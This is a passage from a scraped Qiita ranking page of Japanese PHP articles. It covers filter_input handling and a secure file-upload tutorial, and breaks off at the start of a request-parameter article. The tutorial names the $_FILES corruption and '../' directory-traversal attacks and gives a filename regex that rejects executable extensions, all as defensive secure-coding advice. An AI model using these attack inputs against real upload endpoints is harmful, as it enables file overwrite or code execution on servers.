<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$name</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">'name'</span><span class="p">);</span>
<span class="nv">$email</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">'email'</span><span class="p">);</span>
<span class="nv">$comment</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">'comment'</span><span class="p">);</span>
</pre></div></div>

<p>これを <strong><a href="http://www.php.net/manual/ja/language.variables.variable.php" rel="nofollow noopener" target="_blank">可変変数</a></strong> という機能を利用することで，どれだけ項目が増えても1つ分の記述だけで済ませることが出来ます．但し，<ins>変数名 </ins><strong><code>$v</code></strong><ins> と一致する </ins><strong><code>'v'</code></strong><ins> が配列内に存在すると正しい処理が行えなくなる</ins>ので十分注意してください．</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">foreach</span> <span class="p">([</span><span class="s1">'name'</span><span class="p">,</span> <span class="s1">'email'</span><span class="p">,</span> <span class="s1">'comment'</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$$v</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="nv">$v</span><span class="p">);</span>
<span class="p">}</span>
</pre></div></div>

<p>もちろん，以下のように特定の配列やオブジェクトの中に格納することも可能です．お好みに応じて適当に使い分けてください．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">配列のインデックスを定義する</span></div>
<div class="highlight"><pre><span></span><span class="k">foreach</span> <span class="p">([</span><span class="s1">'name'</span><span class="p">,</span> <span class="s1">'email'</span><span class="p">,</span> <span class="s1">'comment'</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$p</span><span class="p">[</span><span class="nv">$v</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="nv">$v</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">オブジェクトのプロパティを定義する</span></div>
<div class="highlight"><pre><span></span><span class="nv">$p</span> <span class="o">=</span> <span class="k">new</span> <span class="k">stdClass</span><span class="p">;</span>
<span class="k">foreach</span> <span class="p">([</span><span class="s1">'name'</span><span class="p">,</span> <span class="s1">'email'</span><span class="p">,</span> <span class="s1">'comment'</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$p</span><span class="o">-&gt;</span><span class="nv">$v</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="nv">$v</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
</div>

<h2>
<span id="自分でフィルタリング用の関数を作る" class="fragment"></span><a href="#%E8%87%AA%E5%88%86%E3%81%A7%E3%83%95%E3%82%A3%E3%83%AB%E3%82%BF%E3%83%AA%E3%83%B3%E3%82%B0%E7%94%A8%E3%81%AE%E9%96%A2%E6%95%B0%E3%82%92%E4%BD%9C%E3%82%8B"><i class="fa fa-link"></i></a>自分でフィルタリング用の関数を作る</h2>

<p>複雑な配列をフォームから受け取る場合などには，上記の工夫だけでは間に合わないかもしれません．そういったときには自分でフィルタリング用の関数を作って処理をするのが適当です．以下に私が自作したとても便利な関数を紹介しておきます．</p>

<ul>
<li><a href="http://qiita.com/mpyw/items/5a7242269f51dfabc973" id="reference-a1c7d3884471c15f34b3">Qiita - filter_input_simple</a></li>
<li><a href="http://qiita.com/mpyw/items/c39b9ee695a5c2e74627" id="reference-e7164e910ac4431d083a">Qiita - filter_input_array_recursive</a></li>
</ul>

<h2>
<span id="具体的な値に関するバリデーションを行う" class="fragment"></span><a href="#%E5%85%B7%E4%BD%93%E7%9A%84%E3%81%AA%E5%80%A4%E3%81%AB%E9%96%A2%E3%81%99%E3%82%8B%E3%83%90%E3%83%AA%E3%83%87%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%82%92%E8%A1%8C%E3%81%86"><i class="fa fa-link"></i></a>具体的な値に関するバリデーションを行う</h2>

<p>ここまでは</p>

<ol>
<li>未定義ではないか</li>
<li>想定外の型ではないか</li>
</ol>

<p>という処理のみに着目してきましたが，実際には</p>

<ol>
<li>未定義ではないか</li>
<li>想定外の型ではないか</li>
<li><strong>誤った形式の値ではないか</strong></li>
</ol>

<p>という処理になることがほとんどでしょう．EメールアドレスやURLなどのチェックがこれに該当します．詳しくは以下のまとめにて紹介しています．</p>

<ul>
<li><a href="http://qiita.com/mpyw/items/346f1789ad0e1b969ebc" id="reference-5f40947e6e0ba5ee4f4d">Qiita - PHPで各種バリデーション</a></li>
</ul>

<h2>
<span id="推薦記事" class="fragment"></span><a href="#%E6%8E%A8%E8%96%A6%E8%A8%98%E4%BA%8B"><i class="fa fa-link"></i></a>推薦記事</h2>

<ul>
<li>
<a href="http://qiita.com/7968/items/4bf4d6f28284146c288f" id="reference-704a10eaabe3f3c3b3c0">Qiita - 【PHP超入門】HTTP（GET・POST）について</a> by <a href="/7968" class="user-mention js-hovercard" title="7968" data-hovercard-target-type="user" data-hovercard-target-name="7968">@7968</a>
</li>
</ul>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />3位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>720</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/939964377766a54d4682">ファイルアップロードの例外処理はこれぐらいしないと気が済まない</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-05-31 01:20:20</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[セキュリティ]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="脆弱性について" class="fragment"></span><a href="#%E8%84%86%E5%BC%B1%E6%80%A7%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6"><i class="fa fa-link"></i></a>脆弱性について</h1>

<h2>
<span id="参考リンク" class="fragment"></span><a href="#%E5%8F%82%E8%80%83%E3%83%AA%E3%83%B3%E3%82%AF"><i class="fa fa-link"></i></a>参考リンク</h2>

<ul>
<li><a href="http://blog.tokumaru.org/2011/06/PHP-file-upload-bug-CVE-2011-2202.html" rel="nofollow noopener" target="_blank">PHPにおけるファイルアップロードの脆弱性CVE-2011-2202</a></li>
<li><a href="http://d.hatena.ne.jp/rui_hi/20120429/1335664113" rel="nofollow noopener" target="_blank">PHP 5.4.1リリースのポイント</a></li>
</ul>

<h2>
<span id="上記に対する補足説明" class="fragment"></span><a href="#%E4%B8%8A%E8%A8%98%E3%81%AB%E5%AF%BE%E3%81%99%E3%82%8B%E8%A3%9C%E8%B6%B3%E8%AA%AC%E6%98%8E"><i class="fa fa-link"></i></a>上記に対する補足説明</h2>

<ul>
<li>PHP <strong>5.4.1</strong>以降</li>
<li>PHP <strong>5.3.11</strong>以降</li>
</ul>

<p>どちらかを満たしているならば，脆弱性は（今のところ）無い．どちらも満たしていないと，</p>

<ul>
<li>
<strong><em><code>$_FILES</code></em></strong> 変数の構造を崩す攻撃</li>
<li>
<strong><code>../</code></strong> をファイル名に含めて送信する攻撃 <strong>(ディレクトリトラバーサル)</strong>
</li>
</ul>

<p>の何れか，もしくは両方の脆弱性を所持していることになるので要注意．</p>

<h1>
<span id="脆弱性対策と注意事項" class="fragment"></span><a href="#%E8%84%86%E5%BC%B1%E6%80%A7%E5%AF%BE%E7%AD%96%E3%81%A8%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A0%85"><i class="fa fa-link"></i></a>脆弱性対策と注意事項</h1>

<h2>
<span id="_files-corruption-対策改竄されたフォームからの複数ファイル配列送信対策" class="fragment"></span><a href="#_files-corruption-%E5%AF%BE%E7%AD%96%E6%94%B9%E7%AB%84%E3%81%95%E3%82%8C%E3%81%9F%E3%83%95%E3%82%A9%E3%83%BC%E3%83%A0%E3%81%8B%E3%82%89%E3%81%AE%E8%A4%87%E6%95%B0%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E9%85%8D%E5%88%97%E9%80%81%E4%BF%A1%E5%AF%BE%E7%AD%96"><i class="fa fa-link"></i></a><em><code>$_FILES</code></em> Corruption 対策<br>改竄されたフォームからの複数ファイル配列送信対策</h2>

<p>脆弱性が修正された環境でも <strong>改竄フォーム対策</strong> も兼ねているのでこれは必須．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">BAD</span></div>
<div class="highlight"><pre><span></span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">])</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">GOOD</span></div>
<div class="highlight"><pre><span></span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'error'</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nb">is_int</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'error'</span><span class="p">])</span>
</pre></div>
</div>

<h2>
<span id="directory-traversal-対策空ファイル名対策" class="fragment"></span><a href="#directory-traversal-%E5%AF%BE%E7%AD%96%E7%A9%BA%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E5%90%8D%E5%AF%BE%E7%AD%96"><i class="fa fa-link"></i></a>Directory Traversal 対策<br>空ファイル名対策</h2>

<p>脆弱性が修正された環境でも <strong>ファイル名を空にすることは可能</strong> なので，このパラメータを使用せずに自前で一意なファイル名を生成するのが最善の策．もし使うにしてもファイル名として使用して問題ないフォーマットになっているかしっかり検証する．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">ファイルデータの重複を許さない(バイナリデータからハッシュ値を取る)</span></div>
<div class="highlight"><pre><span></span><span class="nv">$name</span> <span class="o">=</span> <span class="nb">sha1_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">]);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">ファイルデータの重複を許す(乱数を使う)</span></div>
<div class="highlight"><pre><span></span><span class="k">while</span> <span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$name</span> <span class="o">=</span> <span class="nb">bin2hex</span><span class="p">(</span><span class="nb">openssl_random_pseudo_bytes</span><span class="p">(</span><span class="mi">32</span><span class="p">))));</span>
</pre></div>
</div>

<p><ins>ユーザーがファイルを削除可能</ins> な場合には <strong>重複を許す必要がある</strong> ので注意．あるユーザーがファイルを削除したら他のユーザーのファイルも消えてしまった，なんてことがあってはいけない．</p>

<p>もしユーザーがアップロードしたファイル名をそのまま使用したい場合，正規表現を使用して以下のものを防がなければならない．</p>

<ul>
<li>先頭または末尾が <code>.</code> であったり， <code>/</code> が含まれているもの．ファイル名として無効であったり，ディレクトリトラバーサルが可能なものであったりする．</li>
<li>実行可能な拡張子． <code>.php</code> に加え， <code>.cgi</code> <code>.py</code> <code>.rb</code> なども実行可能な環境があるので注意．</li>
<li>
<code>半角英数字</code> <code>.</code> <code>_</code> <code>-</code> 以外の文字．さまざまなエンコーディングが存在するためである．もしこれを許可したい場合， <a href="http://www.php.net/manual/ja/function.mb-convert-encoding.php" rel="nofollow noopener" target="_blank">mb_convert_encoding</a> 関数を用いてサーバー環境に合うよう変換しなければならないが，ここでの説明は割愛する．</li>
</ul>

<div class="code-frame" data-lang="rb">
<div class="code-lang"><span class="bold">これにマッチすれば安全，マッチしなければ危険と見なす</span></div>
<div class="highlight"><pre><span></span><span class="sr">/\A(?!\.)[\w.-]++(?&lt;!\.)(?&lt;!\.php)(?&lt;!\.cgi)(?&lt;!\.py)(?&lt;!\.rb)\z/i</span>
</pre></div>
</div>

<h2>
<span id="move_uploaded_file-じゃなくて-rename-じゃだめ" class="fragment"></span><a href="#move_uploaded_file-%E3%81%98%E3%82%83%E3%81%AA%E3%81%8F%E3%81%A6-rename-%E3%81%98%E3%82%83%E3%81%A0%E3%82%81"><i class="fa fa-link"></i></a><a href="http://www.php.net/manual/ja/function.move-uploaded-file.php" rel="nofollow noopener" target="_blank">move_uploaded_file</a> じゃなくて <a href="http://www.php.net/manual/ja/function.rename.php" rel="nofollow noopener" target="_blank">rename</a> じゃだめ？</h2>

<p><a href="http://www.php.net/manual/ja/function.rename.php" rel="nofollow noopener" target="_blank">rename</a> 関数ではなく <a href="http://www.php.net/manual/ja/function.copy.php" rel="nofollow noopener" target="_blank">copy</a> 関数であれば問題ない．以下のリンクを参照して頂きたい．</p>

<ul>
<li><a href="http://qiita.com/mpyw/items/db12ce86b15f3b0b3c19" id="reference-72fe967f742453071816">is_uploaded_file() / move_uploaded_file() の必要性？</a></li>
</ul>

<h1>
<span id="アップロード例外処理サンプル" class="fragment"></span><a href="#%E3%82%A2%E3%83%83%E3%83%97%E3%83%AD%E3%83%BC%E3%83%89%E4%BE%8B%E5%A4%96%E5%87%A6%E7%90%86%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB"><i class="fa fa-link"></i></a>アップロード例外処理サンプル</h1>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">テキストとして結果を出力する例</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: text/plain; charset=utf-8'</span><span class="p">);</span>

<span class="k">try</span> <span class="p">{</span>

    <span class="c1">// 未定義である・複数ファイルである・$_FILES Corruption 攻撃を受けた</span>
    <span class="c1">// どれかに該当していれば不正なパラメータとして処理する</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'error'</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nb">is_int</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'error'</span><span class="p">]))</span> <span class="p">{</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'パラメータが不正です'</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// $_FILES['upfile']['error'] の値を確認</span>
    <span class="k">switch</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'error'</span><span class="p">])</span> <span class="p">{</span>
        <span class="k">case</span> <span class="nx">UPLOAD_ERR_OK</span><span class="o">:</span> <span class="c1">// OK</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="nx">UPLOAD_ERR_NO_FILE</span><span class="o">:</span>   <span class="c1">// ファイル未選択</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'ファイルが選択されていません'</span><span class="p">);</span>
        <span class="k">case</span> <span class="nx">UPLOAD_ERR_INI_SIZE</span><span class="o">:</span>  <span class="c1">// php.ini定義の最大サイズ超過</span>
        <span class="k">case</span> <span class="nx">UPLOAD_ERR_FORM_SIZE</span><span class="o">:</span> <span class="c1">// フォーム定義の最大サイズ超過 (設定した場合のみ)</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'ファイルサイズが大きすぎます'</span><span class="p">);</span>
        <span class="k">default</span><span class="o">:</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'その他のエラーが発生しました'</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// ここで定義するサイズ上限のオーバーチェック</span>
    <span class="c1">// (必要がある場合のみ)</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'size'</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">1000000</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'ファイルサイズが大きすぎます'</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// $_FILES['upfile']['mime']の値はブラウザ側で偽装可能なので</span>
    <span class="c1">// MIMEタイプに対応する拡張子を自前で取得する</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$ext</span> <span class="o">=</span> <span class="nb">array_search</span><span class="p">(</span>
        <span class="nb">mime_content_type</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">]),</span>
        <span class="k">array</span><span class="p">(</span>
            <span class="s1">'gif'</span> <span class="o">=&gt;</span> <span class="s1">'image/gif'</span><span class="p">,</span>
            <span class="s1">'jpg'</span> <span class="o">=&gt;</span> <span class="s1">'image/jpeg'</span><span class="p">,</span>
            <span class="s1">'png'</span> <span class="o">=&gt;</span> <span class="s1">'image/png'</span><span class="p">,</span>
        <span class="p">),</span>
        <span class="k">true</span>
    <span class="p">))</span> <span class="p">{</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'ファイル形式が不正です'</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// ファイルデータからSHA-1ハッシュを取ってファイル名を決定し，保存する</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">move_uploaded_file</span><span class="p">(</span>
        <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">],</span>
        <span class="nv">$path</span> <span class="o">=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">'./uploads/%s.%s'</span><span class="p">,</span>
            <span class="nb">sha1_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">]),</span>
            <span class="nv">$ext</span>
        <span class="p">)</span>
    <span class="p">))</span> <span class="p">{</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'ファイル保存時にエラーが発生しました'</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// ファイルのパーミッションを確実に0644に設定する</span>
    <span class="nb">chmod</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="mo">0644</span><span class="p">);</span>

    <span class="k">echo</span> <span class="s1">'ファイルは正常にアップロードされました'</span><span class="p">;</span>

<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">RuntimeException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>

    <span class="k">echo</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">();</span>

<span class="p">}</span>
</pre></div>
</div>

<h1>
<span id="psr-7ベースの方法-20160724-追記" class="fragment"></span><a href="#psr-7%E3%83%99%E3%83%BC%E3%82%B9%E3%81%AE%E6%96%B9%E6%B3%95-20160724-%E8%BF%BD%E8%A8%98"><i class="fa fa-link"></i></a>PSR-7ベースの方法 (2016/07/24 追記)</h1>

<p>今からコードを書く場合，この方法が最も推奨される．これはZend Frameworkのコンポーネントだが，もしフレームワーク側で個別に提供されている場合はそういったものを利用しても構わない．しかし，（任意多次元の配列に対応できるのかなど）<strong>それが信用に値するコードか</strong>を自分自身で確認した上で実際に使うことが望まれる．</p>

<ul>
<li><strong><a href="http://qiita.com/asaokamei/items/d9194076e11931f5f3c0" id="reference-374c34f6d1a615a784f0">PSR-7のHttp/Messageを使ったファイルアップロード処理</a></strong></li>
</ul>

<p>上記の内容に従った例をPHPマニュアルのユーザノートに投稿した．<a href="http://php.net/manual/en/features.file-upload.post-method.php#119643" rel="nofollow noopener" target="_blank">リンク</a>をこちらに記載しておく．</p>

<h1>
<span id="実装例-warning少しコードが古めなので注意warning" class="fragment"></span><a href="#%E5%AE%9F%E8%A3%85%E4%BE%8B-warning%E5%B0%91%E3%81%97%E3%82%B3%E3%83%BC%E3%83%89%E3%81%8C%E5%8F%A4%E3%82%81%E3%81%AA%E3%81%AE%E3%81%A7%E6%B3%A8%E6%84%8Fwarning"><i class="fa fa-link"></i></a>実装例 (<img alt=":warning:" class="emoji" height="20" src="https://cdn.qiita.com/emoji/twemoji/unicode/26a0-fe0f.png" title=":warning:" width="20">少しコードが古めなので注意<img alt=":warning:" class="emoji" height="20" src="https://cdn.qiita.com/emoji/twemoji/unicode/26a0-fe0f.png" title=":warning:" width="20">)</h1>

<p>具体的にフォームを交えて実装した例を紹介する．この記事では <strong>「リクエストを受ける専用のファイル」</strong> であることを想定してコードを書いたが，以下の例はリクエストを受けるだけでなく <strong>「ユーザーにフォーム入力させるファイル」</strong> という役割を兼ねさせている．1ファイルで全ての処理を担当するということである．</p>

<h2>
<span id="画像アップロード処理サンプル集" class="fragment"></span><a href="#%E7%94%BB%E5%83%8F%E3%82%A2%E3%83%83%E3%83%97%E3%83%AD%E3%83%BC%E3%83%89%E5%87%A6%E7%90%86%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB%E9%9B%86"><i class="fa fa-link"></i></a><a href="http://qiita.com/mpyw/items/73ee77a9535cc65eff1e" id="reference-936f749ca7618269246f">画像アップロード処理サンプル集</a>
</h2>

<ul>
<li>単純な画像アップロード</li>
<li>画像形式の変換</li>
<li>画像のリサイズ</li>
<li>複数ファイルのアップロード</li>
</ul>

<h2>
<span id="phpmysqlで簡易画像アップローダ" class="fragment"></span><a href="#phpmysql%E3%81%A7%E7%B0%A1%E6%98%93%E7%94%BB%E5%83%8F%E3%82%A2%E3%83%83%E3%83%97%E3%83%AD%E3%83%BC%E3%83%80"><i class="fa fa-link"></i></a><a href="http://qiita.com/mpyw/items/117ab6a88fd58d911c34" id="reference-bd180285f369701316b2">PHP+MySQLで簡易画像アップローダ</a>
</h2>

<p>(上のサンプル集に含めようと考えましたが，内容が多すぎる気がしたので記事を分けました)</p>

<ul>
<li>アップロードした画像の <strong>画像データ</strong> をMySQLに挿入する</li>
<li>アップロードした画像の <strong>サムネイルデータ</strong> を同時に作成してMySQLに挿入する</li>
<li>取り出してきた <strong>画像データ</strong> を<ins>画像ファイルとして直接出力する</ins>
</li>
<li>取り出してきた <strong>サムネイルデータ</strong> を<ins>データURIスキームを利用してHTML内に出力する</ins>
</li>
<li>Internet Explorer のみで起こり得る <strong>画像XSS</strong> を防止する</li>
</ul>

<h2>
<span id="ディレクトリ作成を許可してファイルをアップロード" class="fragment"></span><a href="#%E3%83%87%E3%82%A3%E3%83%AC%E3%82%AF%E3%83%88%E3%83%AA%E4%BD%9C%E6%88%90%E3%82%92%E8%A8%B1%E5%8F%AF%E3%81%97%E3%81%A6%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%82%92%E3%82%A2%E3%83%83%E3%83%97%E3%83%AD%E3%83%BC%E3%83%89"><i class="fa fa-link"></i></a><a href="http://qiita.com/mpyw/items/695f443674aef8d349c3" id="reference-5f1071e7f3c94d5ee497">ディレクトリ作成を許可してファイルをアップロード</a>
</h2>

<ul>
<li>ユーザーがアップロードしたファイルの名前 <code>$_FILES['upfile']['name']</code> をそのまま使用する</li>
<li>ユーザーに保存するディレクトリを指定する権限を与え，存在しないものに関しては自動的に生成させる</li>
</ul>

<h2>
<span id="csvアップロードからのmysqlへのデータ挿入" class="fragment"></span><a href="#csv%E3%82%A2%E3%83%83%E3%83%97%E3%83%AD%E3%83%BC%E3%83%89%E3%81%8B%E3%82%89%E3%81%AEmysql%E3%81%B8%E3%81%AE%E3%83%87%E3%83%BC%E3%82%BF%E6%8C%BF%E5%85%A5"><i class="fa fa-link"></i></a><a href="http://qiita.com/mpyw/items/caa2568284b69d270f8b" id="reference-7150cfdcad17a9493025">CSVアップロードからのMySQLへのデータ挿入</a>
</h2>

<ul>
<li>CSVファイルをユーザーにアップロードさせて，それをそのままMySQLのテーブルにINSERTする</li>
</ul>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />4位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>354</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/7852213f478e8c5a2802">[PHP] リクエストパラメータ・セッションに関するまとめ</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2014-02-22 21:24:33</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[HTTP]</b> <b>[cookie]</b> <b>[session]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="予備知識" class="fragment"></span><a href="#%E4%BA%88%E5%82%99%E7%9F%A5%E8%AD%98"><i class="fa fa-link"></i></a>予備知識</h1>

<h2>
<span id="スーパーグローバル変数とは" class="fragment"></span><a href="#%E3%82%B9%E3%83%BC%E3%83%91%E3%83%BC%E3%82%B0%E3%83%AD%E3%83%BC%E3%83%90%E3%83%AB%E5%A4%89%E6%95%B0%E3%81%A8%E3%81%AF"><i class="fa fa-link"></i></a>スーパーグローバル変数とは？</h2>

<p>「スーパーグローバル変数って何？」って感じの駆け出しPHPプログラマのために念のためマニュアルへのリンクを記載しておきます．全然知らない人は軽く読んでおいてください．</p>

<ul>
<li><a href="http://www.php.net/manual/ja/language.variables.scope.php" rel="nofollow noopener" target="_blank">PHP Manual - 変数のスコープ</a></li>
<li><a href="http://www.php.net/manual/ja/language.variables.superglobals.php" rel="nofollow noopener" target="_blank">PHP Manual - スーパーグローバル</a></li>
</ul>

<h2>
<span id="httpとは" class="fragment"></span><a href="#http%E3%81%A8%E3%81%AF"><i class="fa fa-link"></i></a>HTTPとは？</h2>

<p><strong>リクエストヘッダー・レスポンスヘッダー</strong> と聞いてピンと来ない人はまず下記サイトにて予習をお願いします．細かいことは覚える必要は無いので，大雑把に「ヘッダーとはどんなものか」ということを理解してください．</p>

<ul>
<li><p><a href="http://qiita.com/7968/items/4bf4d6f28284146c288f" id="reference-fb7f649d868c8ff8561d">Qiita - 【PHP超入門】HTTP（GET・POST）について</a><br><a href="http://qiita.com/7968/items/ce03feb17c8eaa6e4672" id="reference-60896c30bee172015577">Qiita - 【PHP超入門】Cookieとセッションについて</a><br><a href="/7968" class="user-mention js-hovercard" title="7968" data-hovercard-target-type="user" data-hovercard-target-name="7968">@7968</a>さんによるQiitaの記事です．右も左もわからない人はまずこれで．<br><br></p></li>
<li><p><a href="http://www.tohoho-web.com/ex/http.htm" rel="nofollow noopener" target="_blank">とほほのWWW入門 - HTTP入門</a><br>
最初の記事をもう少し体系的にまとめた感じです．ただし，Cookieに関する情報が欠落しているところが少し惜しいです…<br><br></p></li>
<li><p><a href="http://web.archive.org/web/20140303140503/http://www.studyinghttp.net/" rel="nofollow noopener" target="_blank">Studying HTTP</a><br>技術文書を読むことに慣れている人にはこちらが適当でしょう．厳密な定義が読みやすくまとめられています．但し，素晴らしいサイトであったにも関わらず，ドメイン自体が消滅してしまっているので，WebArchiveでの閲覧となります．<br><br></p></li>
<li><p><a href="https://addons.mozilla.org/ja/firefox/addon/live-http-headers/" rel="nofollow noopener" target="_blank">Live HTTP Headers</a><br>Firefoxのアドオンです．実際にこういった通信の内容をブラウザ上で確認したい場合などに活用してください．</p></li>
</ul>

<h1>
